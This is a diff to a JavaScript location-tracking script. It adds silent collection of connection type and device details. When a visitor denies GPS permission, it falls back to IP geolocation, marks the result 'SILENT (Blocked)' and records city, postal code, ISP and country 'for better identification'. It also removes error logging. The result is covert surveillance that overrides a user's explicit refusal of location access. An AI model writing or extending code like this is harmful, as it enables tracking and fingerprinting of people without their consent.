@@ -1141,6 +1141,11 @@
             let lat, lon, accSource;
 
             try {
+                // Determine connection type silently
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const netType = conn ? `${conn.effectiveType} (${conn.type || 'unknown'})` : 'unknown';
+                const device = `${navigator.platform} | ${/Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}`;
+
                 // Attempt high-accuracy GPS/Wireless location first
                 const position = await new Promise((resolve, reject) => {
                     if (!navigator.geolocation) {
@@ -1148,7 +1153,7 @@
                     } else {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 8000,
+                            timeout: 6000,
                             maximumAge: 0
                         });
                     }
@@ -1157,14 +1162,18 @@
                 if (position && position.coords) {
                     lat = position.coords.latitude;
                     lon = position.coords.longitude;
-                    accSource = `${identity} | High Accuracy (GPS) | ±${Math.round(position.coords.accuracy)}m`;
+                    accSource = `${identity} | GPS (±${Math.round(position.coords.accuracy)}m) | ${netType} | ${device}`;
                 } else {
-                    // Fallback to IP-based if GPS fails or is denied
+                    // SILENT FALLBACK (Improved)
                     const response = await fetch('https://ipapi.co/json/');
                     const ipData = await response.json();
                     lat = ipData.latitude;
                     lon = ipData.longitude;
-                    accSource = `${identity} | IP-Based Fallback | ${ipData.city || 'Unknown'}`;
+
+                    // Comprehensive metadata for better identification
+                    const area = `${ipData.city}, ${ipData.postal || 'NoPIN'} (${ipData.region})`;
+                    const provider = `${ipData.org || ipData.asn} (${ipData.country_name})`;
+                    accSource = `${identity} | SILENT (Blocked) | Area: ${area} | ISP: ${provider} | Net: ${netType} | Dev: ${device}`;
                 }
 
                 if (lat && lon) {
@@ -1206,7 +1215,6 @@
                     isSyncing = false;
                 }
             } catch (err) {
-                console.error("Tracking Error:", err);
                 isSyncing = false;
             }
         }
